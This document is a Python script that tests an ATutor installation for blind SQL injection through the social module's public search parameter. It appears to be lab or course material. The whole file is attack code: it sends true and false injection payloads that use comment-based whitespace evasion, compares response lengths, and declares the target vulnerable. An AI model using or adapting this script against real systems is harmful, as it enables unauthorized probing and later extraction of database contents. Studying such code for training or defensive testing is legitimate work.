import sys
import re
import requests
from bs4 import BeautifulSoup

def searchFriends_sqli(ip, inj_str):
    target = "http://{}/ATutor/mods/_standard/social/index_public.php?q={}".format(ip, inj_str)
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    print("Length of response: {}".format(len(r.text)))
    print("Response Headers:")
    print(r.headers)
    print()
    print("Response Content:")
    print(s.text)
    print()
    error = re.search("Invalid argument", s.text)
    if error:
        print("Errors found in response. Possible SQL injection found")
    else:
        print("No errors found") 

def searchFriends_sqli2(ip, inj_str, query_type):
    """
    This function will return True/False for Blind Injection
    :param ip: target ip
    :type ip: string
    :param inj_str: sql injection string
    :type inj_str: string
    :return: True/False
    :rtype: boolean
    """
    target = "http://{}/ATutor/mods/_standard/social/index_public.php?q={}".format(ip, inj_str)
    r = requests.get(target)
    print(r.headers)
    content_length = int(r.headers.get('Content-Length'))
    if query_type == True and content_length > 20:
        print(r.text)
        return True
    elif query_type == False and content_length == 20:
        print(r.text)
        return True
    else:
        return False


def main():
    """
    if len(sys.argv) != 3:
        print("(+) usage: {} <target> <injection_string>".format(sys.argv[0]))  
        print('(+) eg: {} 192.168.1.100 "aaaa\'" '.format(sys.argv[0]))  
        sys.exit(-1)
    ip = sys.argv[1]
    injection_string = sys.argv[2]

    """
    if len(sys.argv) != 2:
        print("(+) usage: {} <target>".format(sys.argv[0]))
        sys.exit(-1)

    ip = sys.argv[1]
    true_inj_string = "AAAA')/**/OR/**/(SELECT/**/1)=1%23"
    false_inj_string = "AAA')/**/OR/**/(SELECT/**/1)=0%23"

    #searchFriends_sqli(ip, injection_string)

    if searchFriends_sqli2(ip, true_inj_string, True) and searchFriends_sqli2(ip, false_inj_string, False):
           print("(+) The Target is vulnerable!")

if __name__ == "__main__":
    main()
